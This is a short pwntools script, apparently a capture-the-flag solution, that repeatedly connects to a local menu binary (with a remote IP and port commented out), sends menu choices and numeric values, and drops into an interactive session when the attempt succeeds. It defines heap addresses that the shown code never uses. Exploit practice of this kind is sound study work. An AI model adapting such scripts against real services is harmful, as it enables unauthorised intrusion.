from pwn import *


def run():
    p = process('./attach')
    # p = remote('59.110.164.72', 10021)

    chunk_list = 0x6024E0
    str1 = 0x6021E8
    str2 = 0x602228
    size_list = 0x6020E0

    p.recvuntil(b'5')
    p.sendline(b'1')
    sleep(0.1)
    p.sendline(b'66')
    sleep(0.1)
    p.sendline(b'365696460')

    p.recvuntil(b'5')
    p.sendline(b'1')
    sleep(0.1)
    p.sendline(b'82')
    sleep(0.1)

    try:
        p.sendline(b'3427912785')
        sleep(0.1)
        p.recvuntil(b'5')
    except:
        p.close()
        return 0

    p.interactive()

if __name__ == '__main__':
    while True:
        run()
